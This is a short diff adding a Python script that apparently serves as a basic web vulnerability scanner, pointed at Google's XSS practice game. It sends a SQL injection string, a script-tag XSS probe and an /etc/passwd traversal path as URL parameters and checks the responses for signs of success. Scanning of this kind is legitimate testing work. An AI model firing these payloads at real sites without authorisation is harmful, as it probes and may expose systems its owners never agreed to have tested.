@@ -1,0 +1,38 @@
+#! usr/bin/python3
+import requests
+
+def scan_web_app(url):
+    # Check for common vulnerabilities
+    vulnerabilities = []
+
+    # Check for SQL injection
+    payload = "' OR '1'='1"
+    response = requests.get(url + "?param=" + payload)
+    if "error" in response.text:
+        vulnerabilities.append("SQL Injection")
+
+    # Check for XSS
+    payload = "<script>alert('XSS')</script>"
+    response = requests.get(url + "?param=" + payload)
+    if "<script>alert('XSS')</script>" in response.text:
+        vulnerabilities.append("Cross-Site Scripting (XSS)")
+
+    # Check for directory traversal
+    payload = "../../../../etc/passwd"
+    response = requests.get(url + "?file=" + payload)
+    if "root:" in response.text:
+        vulnerabilities.append("Directory Traversal")
+
+    # Add more vulnerability checks as needed...
+
+    return vulnerabilities
+
+# Usage example
+target_url = "https://xss-game.appspot.com/level1"
+vulnerabilities_found = scan_web_app(target_url)
+if vulnerabilities_found:
+    print("Vulnerabilities found in the web app:")
+    for vulnerability in vulnerabilities_found:
+        print("- " + vulnerability)
+else:
+    print("No vulnerabilities found in the web app.")
